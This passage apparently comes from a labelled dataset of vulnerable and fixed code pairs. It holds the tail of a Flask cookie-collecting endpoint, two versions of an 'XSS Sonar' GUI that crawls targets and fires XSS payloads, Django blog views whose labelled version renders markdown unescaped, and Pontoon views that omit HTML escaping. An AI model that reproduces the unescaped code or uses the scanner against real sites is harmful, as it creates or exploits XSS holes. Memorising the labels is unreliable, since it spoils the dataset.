		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1
118,7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1,"xss.py/n/nimport sys,threading,time
from datetime import datetime
try:
 from tkinter import *
 from tkinter import ttk
except:
 print(""You need to install: tkinter"")
 sys.exit()
try:
 import bane
except:
 print(""You need to install: bane"")
 sys.exit()

class sc(threading.Thread):
 def run(self):
  global stop
  ti=time.time()
  print(""=""*25)
  print(""\n[*]Target: {}\n[*]Date: {}"".format(target.get(),datetime.now().strftime(""%d/%m/%Y %H:%M:%S"")))
  crl=[target.get()]
  if crawl.get()=='On':
   crl+=bane.crawl(target.get(),bypass=True)
  pr=proxy.get()
  if len(pr)==0:
   pr=None
  if method.get()==""GET"":
   get=True
   post=False
  elif method.get()==""POST"":
   get=False
   post=True
  else:
   get=True
   post=True
  fresh=False
  if refresh.get()==""On"":
   fresh=True
  ck=None
  c=cookie.get()
  if len(c)>0:
   ck=c
  for x in crl:
   if stop==True:
    break
   print(""[*]URL: {}"".format(x))
   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)
  print(""[*]Test was finished at: {}\n[*]Duration: {} seconds\n"".format(datetime.now().strftime(""%d/%m/%Y %H:%M:%S""),int(time.time()-ti)))
  print(""=""*25)

stop=False

def scan():
 sc().start()

class ki(threading.Thread):
 def run(self):
  global stop
  stop=True

def kill():
 ki().start()

main = Tk()
main.title(""XSS Sonar"")
main.configure(background='light sky blue')
Label(main, text = ""Target:"",background='light sky blue').grid(row=0)
Label(main, text = ""Cookie: (Optional)"",background='light sky blue').grid(row=1)
Label(main, text = ""Method:"",background='light sky blue').grid(row=2)
Label(main, text = ""Timeout:"",background='light sky blue').grid(row=3)
Label(main, text = ""User-Agent:"",background='light sky blue').grid(row=4)
Label(main, text = ""Payload:"",background='light sky blue').grid(row=5)
Label(main, text = ""HTTP Proxy:"",background='light sky blue').grid(row=6)
Label(main, text = ""Refresh:"",background='light sky blue').grid(row=7)
Label(main, text = ""Crawl"",background='light sky blue').grid(row=8)
Label(main, text = """",background='light sky blue').grid(row=9)
Label(main, text = """",background='light sky blue').grid(row=10)

ua=[""""]
ua+=bane.ua
li=bane.read_file('xss.txt')
pl=['']
for x in li:
 pl.append(x.strip())
prox=[""""]
prox+=bane.http(200)
global target
target = Entry(main)
target.insert(0,'http://')
global cookie
cookie=Entry(main)
global method
method= ttk.Combobox(main, values=[""GET & POST"", ""GET"", ""POST""])
global timeout
timeout=ttk.Combobox(main, values=range(1,61))
timeout.current(14)
global user_agent
user_agent=ttk.Combobox(main, values=ua)
user_agent.current(1)
global payload
payload = ttk.Combobox(main, values=pl)
payload.current(0)
global proxy
proxy=ttk.Combobox(main, values=prox)
global refresh
refresh=ttk.Combobox(main, values=[""On"", ""Off""])
global crawl
crawl=ttk.Combobox(main, values=[""On"", ""Off""])

target.grid(row=0, column=1)
target.config(width=30)
cookie.grid(row=1, column=1)
cookie.config(width=30)
method.grid(row=2, column=1)
method.current(0)
method.config(width=30)
timeout.grid(row=3, column=1)
timeout.config(width=30)
user_agent.grid(row=4, column=1)
user_agent.config(width=30)
payload.grid(row=5, column=1)
payload.config(width=30)
proxy.grid(row=6, column=1)
proxy.current(0)
proxy.config(width=30)
refresh.grid(row=7, column=1)
refresh.current(1)
refresh.config(width=30)
crawl.grid(row=8, column=1)
crawl.current(0)
crawl.config(width=30)

Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)
Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)
Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)
Label(main, text = ""\n\nCoder: Ala Bouali\nGithub: https://github.com/AlaBouali\nE-mail: trap.leader.123@gmail.com\n\nDisclaimer:\nThis tool is for educational purposes only!!!\n\n\n"", background='light sky blue').grid(row=12,column=1)
mainloop()
/n/n/n",0
119,7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1,"/xss.py/n/nimport sys,threading,time
from datetime import datetime
try:
 from tkinter import *
 from tkinter import ttk
except:
 print(""You need to install: tkinter"")
 sys.exit()
try:
 import bane
except:
 print(""You need to install: bane"")
 sys.exit()

class sc(threading.Thread):
 def run(self):
  global stop
  ti=time.time()
  print(""=""*25)
  print(""\n[*]Target: {}\n[*]Date: {}"".format(target.get(),datetime.now().strftime(""%d/%m/%Y %H:%M:%S"")))
  crl=[target.get()]
  if crawl.get()=='On':
   crl+=bane.crawl(target.get(),bypass=True)
  pr=proxy.get()
  if len(pr)==0:
   pr=None
  if method.get()==""GET"":
   get=True
   post=False
  elif method.get()==""POST"":
   get=False
   post=True
  else:
   get=True
   post=True
  fresh=False
  if refresh.get()==""On"":
   fresh=True
  ck=None
  c=cookie.get()
  if len(c)>0:
   ck=c
  for x in crl:
   if stop==True:
    break
   print(""[*]URL: {}"".format(x))
   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)
  print(""[*]Test was finished at: {}\n[*]Duration: {} seconds\n"".format(datetime.now().strftime(""%d/%m/%Y %H:%M:%S""),int(time.time()-ti)))
  print(""=""*25)

stop=False

def scan():
 sc().start()

class ki(threading.Thread):
 def run(self):
  global stop
  stop=True

def kill():
 ki().start()

main = Tk()
main.title(""XSS Sonar"")
main.configure(background='light sky blue')
Label(main, text = ""Target:"",background='light sky blue').grid(row=0)
Label(main, text = ""Cookie: (Optional)"",background='light sky blue').grid(row=1)
Label(main, text = ""Method:"",background='light sky blue').grid(row=2)
Label(main, text = ""Timeout:"",background='light sky blue').grid(row=3)
Label(main, text = ""User-Agent:"",background='light sky blue').grid(row=4)
Label(main, text = ""Payload:"",background='light sky blue').grid(row=5)
Label(main, text = ""HTTP Proxy:"",background='light sky blue').grid(row=6)
Label(main, text = ""Refresh:"",background='light sky blue').grid(row=7)
Label(main, text = ""Crawl"",background='light sky blue').grid(row=8)
Label(main, text = """",background='light sky blue').grid(row=9)
Label(main, text = """",background='light sky blue').grid(row=10)

ua=[""""]
ua+=bane.ua
li=bane.read_file('xss.txt')
pl=[]
for x in li:
 pl.append(x.strip())
prox=[""""]
prox+=bane.http(200)
global target
target = Entry(main)
target.insert(0,'http://')
global cookie
cookie=Entry(main)
global method
method= ttk.Combobox(main, values=[""GET & POST"", ""GET"", ""POST""])
global timeout
timeout=ttk.Combobox(main, values=range(1,61))
timeout.current(14)
global user_agent
user_agent=ttk.Combobox(main, values=ua)
user_agent.current(1)
global payload
payload = ttk.Combobox(main, values=pl)
payload.current(0)
global proxy
proxy=ttk.Combobox(main, values=prox)
global refresh
refresh=ttk.Combobox(main, values=[""On"", ""Off""])
global crawl
crawl=ttk.Combobox(main, values=[""On"", ""Off""])

target.grid(row=0, column=1)
target.config(width=30)
cookie.grid(row=1, column=1)
cookie.config(width=30)
method.grid(row=2, column=1)
method.current(0)
method.config(width=30)
timeout.grid(row=3, column=1)
timeout.config(width=30)
user_agent.grid(row=4, column=1)
user_agent.config(width=30)
payload.grid(row=5, column=1)
payload.config(width=30)
proxy.grid(row=6, column=1)
proxy.current(0)
proxy.config(width=30)
refresh.grid(row=7, column=1)
refresh.current(1)
refresh.config(width=30)
crawl.grid(row=8, column=1)
crawl.current(0)
crawl.config(width=30)

Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)
Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)
Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)
Label(main, text = ""\n\nCoder: Ala Bouali\nGithub: https://github.com/AlaBouali\nE-mail: trap.leader.123@gmail.com\n\nDisclaimer:\nThis tool is for educational purposes only!!!\n\n\n"", background='light sky blue').grid(row=12,column=1)
mainloop()
/n/n/n",1
120,333dc34f5feada55d1f6ff1255949ca00dec0f9c,"app/Index/forms.py/n/n/n/n/napp/Index/views.py/n/n# 
import hashlib

from django import forms

# 
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.forms import UserCreationForm, PasswordChangeForm
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin

# 
from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator
from django.http import HttpResponse
from django.urls import reverse

# 
from django.template import RequestContext

# 
from django.shortcuts import Http404, redirect, render, render_to_response

# 
from django.views.generic import ListView, DetailView
from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin

# Markdown
from markdown import markdown
from markdown.extensions import Extension

# 
from .models import Article, Category, Comment


class EscapeHtml(Extension):
    def extendMarkdown(self, md):
        md.preprocessors.deregister('html_block')
        md.inlinePatterns.deregister('html')


def safe_md(string):
    return markdown(string,
                    extensions=[
                        'markdown.extensions.extra',
                        'markdown.extensions.codehilite',
                        'markdown.extensions.toc',
                        EscapeHtml()
                    ], safe_mode=True)


class ArticleForm(forms.ModelForm):
    class Meta:
        model = Article
        fields = ['title', 'category', 'content']


class CommentForm(forms.ModelForm):
    class Meta:
        model = Comment
        fields = ['content']


class UserDetail(DetailView):
    model = User
    template_name = 'user.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['articles'] = self.object.article_set.all()
        context['form'] = CommentForm()
        return context


class RegisterFormView(FormView):
    """"""""""""
    template_name = 'register.html'
    form_class = UserCreationForm
    success_url = '/login/'

    def form_valid(self, form):
        """"""""""""
        form.save()
        return super().form_valid(form)


class ArticlesList(ListView):
    """"""""""""
    model = Article
    context_object_name = 'articles'
    template_name = 'index.html'
    paginate_by = 5

    def get_queryset(self, **kwargs):
        queryset = Article.objects.order_by('-time')
        for i in queryset:
            i.md = safe_md(i.content)

        return queryset


class ArticleDetail(DetailView, FormMixin):
    """"""
    
    FormMixin  
    """"""
    model = Article
    # model.content = markdown(model.content)
    context_object_name = 'article'
    template_name = 'details.html'
    form_class = CommentForm

    def get_success_url(self):
        return reverse('article-detail', kwargs={'pk': self.object.pk})

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['comments'] = self.object.comment_set.all().order_by('-time')
        context['form'] = self.get_form()
        context['md'] = safe_md(self.object.content)

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        a = form.save(commit=False)
        a.author = self.request.user
        a.article = self.object
        a.save()
        return super().form_valid(form)


def is_mobile(useragent):
    devices = [""Android"", ""iPhone"", ""SymbianOS"",
               ""Windows Phone"", ""iPad"", ""iPod""]

    for d in devices:
        if d in useragent:
            return True

    return False


class ArticleFormView(LoginRequiredMixin, FormView):
    """""" Article """"""

    model = Article
    template_name = 'post.html'
    context_object_name = 'articles'
    form_class = ArticleForm
    success_url = '/'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])
        return context

    def form_valid(self, form):
        a = form.save(commit=False)
        a.author = self.request.user
        a.save()
        return super().form_valid(form)


class ArticleUpdateView(UserPassesTestMixin, UpdateView):
    """""" Article """"""
    model = Article
    success_url = '/'
    fields = ['content', 'category']
    template_name = 'update.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])
        return context

    def test_func(self):
        return self.request.user == self.get_object().author


class ArticleDelete(UserPassesTestMixin, DeleteView):
    """"""Article""""""
    model = Article
    success_url = '/'

    def test_func(self):
        return self.request.user == self.get_object().author


class CommentDelete(UserPassesTestMixin, DeleteView):
    """"""""""""
    model = Comment

    def get_success_url(self):
        return reverse('article-detail', kwargs={'pk': self.object.article.pk})

    def test_func(self):
        return self.request.user == self.get_object().author
/n/n/n",0
121,333dc34f5feada55d1f6ff1255949ca00dec0f9c,"/app/Index/views.py/n/n# 
import hashlib

from django import forms

# 
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.forms import UserCreationForm, PasswordChangeForm
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin

# 
from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator
from django.http import HttpResponse
from django.urls import reverse

# 
from django.template import RequestContext

# 
from django.shortcuts import Http404, redirect, render, render_to_response

# 
from django.views.generic import ListView, DetailView
from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin

# Markdown
from markdown import markdown

# 
from .models import Article, Category, Comment


class ArticleForm(forms.ModelForm):
    class Meta:
        model = Article
        fields = ['title', 'category', 'content']


class CommentForm(forms.ModelForm):
    class Meta:
        model = Comment
        fields = ['content']


class UserDetail(DetailView):
    model = User
    template_name = 'user.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['articles'] = self.object.article_set.all()
        context['form'] = CommentForm()
        return context


class RegisterFormView(FormView):
    """"""""""""
    template_name = 'register.html'
    form_class = UserCreationForm
    success_url = '/login/'

    def form_valid(self, form):
        """"""""""""
        form.save()
        return super().form_valid(form)


class ArticlesList(ListView):
    """"""""""""
    model = Article
    context_object_name = 'articles'
    template_name = 'index.html'
    paginate_by = 5

    def get_queryset(self, **kwargs):
        queryset = Article.objects.order_by('-time')
        for i in queryset:
            i.md = markdown(i.content, extensions=[
                'markdown.extensions.extra',
                'markdown.extensions.codehilite',
                'markdown.extensions.toc',
            ])

        return queryset


class ArticleDetail(DetailView, FormMixin):
    """"""
    
    FormMixin  
    """"""
    model = Article
    # model.content = markdown(model.content)
    context_object_name = 'article'
    template_name = 'details.html'
    form_class = CommentForm

    def get_success_url(self):
        return reverse('article-detail', kwargs={'pk': self.object.pk})

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['comments'] = self.object.comment_set.all().order_by('-time')
        context['form'] = self.get_form()
        context['md'] = markdown(self.object.content,
                                 extensions=[
                                     'markdown.extensions.extra',
                                     'markdown.extensions.codehilite',
                                     'markdown.extensions.toc',
                                 ])

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        a = form.save(commit=False)
        a.author = self.request.user
        a.article = self.object
        a.save()
        return super().form_valid(form)


def is_mobile(useragent):
    devices = [""Android"", ""iPhone"", ""SymbianOS"",
               ""Windows Phone"", ""iPad"", ""iPod""]

    for d in devices:
        if d in useragent:
            return True

    return False


class ArticleFormView(LoginRequiredMixin, FormView):
    """""" Article """"""

    model = Article
    template_name = 'post.html'
    context_object_name = 'articles'
    form_class = ArticleForm
    success_url = '/'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])
        return context

    def form_valid(self, form):
        a = form.save(commit=False)
        a.author = self.request.user
        a.save()
        return super().form_valid(form)


class ArticleUpdateView(UserPassesTestMixin, UpdateView):
    """""" Article """"""
    model = Article
    success_url = '/'
    fields = ['content', 'category']
    template_name = 'update.html'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])
        return context

    def test_func(self):
        return self.request.user == self.get_object().author


class ArticleDelete(UserPassesTestMixin, DeleteView):
    """"""Article""""""
    model = Article
    success_url = '/'

    def test_func(self):
        return self.request.user == self.get_object().author


class CommentDelete(UserPassesTestMixin, DeleteView):
    """"""""""""
    model = Comment

    def get_success_url(self):
        return reverse('article-detail', kwargs={'pk': self.object.article.pk})

    def test_func(self):
        return self.request.user == self.get_object().author
/n/n/n",1
122,fc07ed9c68e08d41f74c078b4e7727f1a0888be8,"pontoon/batch/views.py/n/nimport logging

from bulk_update.helper import bulk_update

from django.contrib.auth.decorators import login_required
from django.db import transaction
from django.http import (
    HttpResponseBadRequest,
    HttpResponseForbidden,
    JsonResponse,
)
from django.shortcuts import get_object_or_404
from django.views.decorators.http import (
    require_POST
)

from pontoon.base.models import (
    ChangedEntityLocale,
    Entity,
    Locale,
    Project,
    ProjectLocale,
    TranslationMemoryEntry,
    Translation,
)
from pontoon.base.utils import (
    require_AJAX,
    readonly_exists,
)
from pontoon.batch import forms
from pontoon.batch.actions import ACTIONS_FN_MAP


log = logging.getLogger(__name__)


def update_stats(translated_resources, locale):
    """"""Update stats on a list of TranslatedResource.
    """"""
    projects = set()
    for translated_resource in translated_resources:
        projects.add(translated_resource.resource.project)
        translated_resource.calculate_stats(save=False)

    bulk_update(translated_resources, update_fields=[
        'total_strings',
        'approved_strings',
        'fuzzy_strings',
        'strings_with_errors',
        'strings_with_warnings',
        'unreviewed_strings',
    ])

    locale.aggregate_stats()

    for project in projects:
        project.aggregate_stats()
        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()


def mark_changed_translation(changed_entities, locale):
    """"""Mark entities as changed, for later sync.
    """"""
    changed_entities_array = []
    existing = (
        ChangedEntityLocale.objects
        .values_list('entity', 'locale')
        .distinct()
    )
    for changed_entity in changed_entities:
        key = (changed_entity.pk, locale.pk)

        # Remove duplicate changes to prevent unique constraint violation.
        if key not in existing:
            changed_entities_array.append(
                ChangedEntityLocale(entity=changed_entity, locale=locale)
            )

    ChangedEntityLocale.objects.bulk_create(changed_entities_array)


def update_translation_memory(changed_translation_pks, project, locale):
    """"""Update translation memory for a list of translations.
    """"""
    memory_entries = [
        TranslationMemoryEntry(
            source=t.entity.string,
            target=t.string,
            locale=locale,
            entity=t.entity,
            translation=t,
            project=project,
        ) for t in (
            Translation.objects
            .filter(pk__in=changed_translation_pks)
            .prefetch_related('entity__resource')
        )
    ]
    TranslationMemoryEntry.objects.bulk_create(memory_entries)


@login_required(redirect_field_name='', login_url='/403')
@require_POST
@require_AJAX
@transaction.atomic
def batch_edit_translations(request):
    """"""Perform an action on a list of translations.

    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view
    are defined in `models.BatchActionsForm`.

    """"""
    form = forms.BatchActionsForm(request.POST)
    if not form.is_valid():
        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))

    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])
    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])

    if not entities.exists():
        return JsonResponse({'count': 0})

    # Batch editing is only available to translators. Check if user has
    # translate permissions for all of the projects in passed entities.
    # Also make sure projects are not enabled in read-only mode for a locale.
    projects_pk = entities.values_list('resource__project__pk', flat=True)
    projects = Project.objects.filter(pk__in=projects_pk.distinct())

    for project in projects:
        if (
            not request.user.can_translate(project=project, locale=locale)
            or readonly_exists(projects, locale)
        ):
            return HttpResponseForbidden(
                ""Forbidden: You don't have permission for batch editing""
            )

    # Find all impacted active translations, including plural forms.
    active_translations = Translation.objects.filter(
        active=True,
        locale=locale,
        entity__in=entities,
    )

    # Execute the actual action.
    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]
    action_status = action_function(
        form,
        request.user,
        active_translations,
        locale,
    )

    if action_status.get('error'):
        return JsonResponse(action_status)

    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))
    if action_status['count'] == 0:
        return JsonResponse({
            'count': 0,
            'invalid_translation_count': invalid_translation_count,
        })

    update_stats(action_status['translated_resources'], locale)
    mark_changed_translation(action_status['changed_entities'], locale)

    # Update latest translation.
    if action_status['latest_translation_pk']:
        Translation.objects.get(
            pk=action_status['latest_translation_pk']
        ).update_latest_translation()

    update_translation_memory(
        action_status['changed_translation_pks'],
        project,
        locale
    )

    return JsonResponse({
        'count': action_status['count'],
        'invalid_translation_count': invalid_translation_count,
    })
/n/n/n",0
123,fc07ed9c68e08d41f74c078b4e7727f1a0888be8,"/pontoon/batch/views.py/n/nimport logging

from bulk_update.helper import bulk_update

from django.contrib.auth.decorators import login_required
from django.db import transaction
from django.http import (
    HttpResponseBadRequest,
    HttpResponseForbidden,
    JsonResponse,
)
from django.shortcuts import get_object_or_404
from django.views.decorators.http import (
    require_POST
)

from pontoon.base.models import (
    ChangedEntityLocale,
    Entity,
    Locale,
    Project,
    ProjectLocale,
    TranslationMemoryEntry,
    Translation,
)
from pontoon.base.utils import (
    require_AJAX,
    readonly_exists,
)
from pontoon.batch import forms
from pontoon.batch.actions import ACTIONS_FN_MAP


log = logging.getLogger(__name__)


def update_stats(translated_resources, locale):
    """"""Update stats on a list of TranslatedResource.
    """"""
    projects = set()
    for translated_resource in translated_resources:
        projects.add(translated_resource.resource.project)
        translated_resource.calculate_stats(save=False)

    bulk_update(translated_resources, update_fields=[
        'total_strings',
        'approved_strings',
        'fuzzy_strings',
        'strings_with_errors',
        'strings_with_warnings',
        'unreviewed_strings',
    ])

    locale.aggregate_stats()

    for project in projects:
        project.aggregate_stats()
        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()


def mark_changed_translation(changed_entities, locale):
    """"""Mark entities as changed, for later sync.
    """"""
    changed_entities_array = []
    existing = (
        ChangedEntityLocale.objects
        .values_list('entity', 'locale')
        .distinct()
    )
    for changed_entity in changed_entities:
        key = (changed_entity.pk, locale.pk)

        # Remove duplicate changes to prevent unique constraint violation.
        if key not in existing:
            changed_entities_array.append(
                ChangedEntityLocale(entity=changed_entity, locale=locale)
            )

    ChangedEntityLocale.objects.bulk_create(changed_entities_array)


def update_translation_memory(changed_translation_pks, project, locale):
    """"""Update translation memory for a list of translations.
    """"""
    memory_entries = [
        TranslationMemoryEntry(
            source=t.entity.string,
            target=t.string,
            locale=locale,
            entity=t.entity,
            translation=t,
            project=project,
        ) for t in (
            Translation.objects
            .filter(pk__in=changed_translation_pks)
            .prefetch_related('entity__resource')
        )
    ]
    TranslationMemoryEntry.objects.bulk_create(memory_entries)


@login_required(redirect_field_name='', login_url='/403')
@require_POST
@require_AJAX
@transaction.atomic
def batch_edit_translations(request):
    """"""Perform an action on a list of translations.

    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view
    are defined in `models.BatchActionsForm`.

    """"""
    form = forms.BatchActionsForm(request.POST)
    if not form.is_valid():
        return HttpResponseBadRequest(form.errors.as_json())

    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])
    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])

    if not entities.exists():
        return JsonResponse({'count': 0})

    # Batch editing is only available to translators. Check if user has
    # translate permissions for all of the projects in passed entities.
    # Also make sure projects are not enabled in read-only mode for a locale.
    projects_pk = entities.values_list('resource__project__pk', flat=True)
    projects = Project.objects.filter(pk__in=projects_pk.distinct())

    for project in projects:
        if (
            not request.user.can_translate(project=project, locale=locale)
            or readonly_exists(projects, locale)
        ):
            return HttpResponseForbidden(
                ""Forbidden: You don't have permission for batch editing""
            )

    # Find all impacted active translations, including plural forms.
    active_translations = Translation.objects.filter(
        active=True,
        locale=locale,
        entity__in=entities,
    )

    # Execute the actual action.
    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]
    action_status = action_function(
        form,
        request.user,
        active_translations,
        locale,
    )

    if action_status.get('error'):
        return JsonResponse(action_status)

    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))
    if action_status['count'] == 0:
        return JsonResponse({
            'count': 0,
            'invalid_translation_count': invalid_translation_count,
        })

    update_stats(action_status['translated_resources'], locale)
    mark_changed_translation(action_status['changed_entities'], locale)

    # Update latest translation.
    if action_status['latest_translation_pk']:
        Translation.objects.get(
            pk=action_status['latest_translation_pk']
        ).update_latest_translation()

    update_translation_memory(
        action_status['changed_translation_pks'],
        project,
        locale
    )

    return JsonResponse({
        'count': action_status['count'],
        'invalid_translation_count': invalid_translation_count,
    })
/n/n/n",1
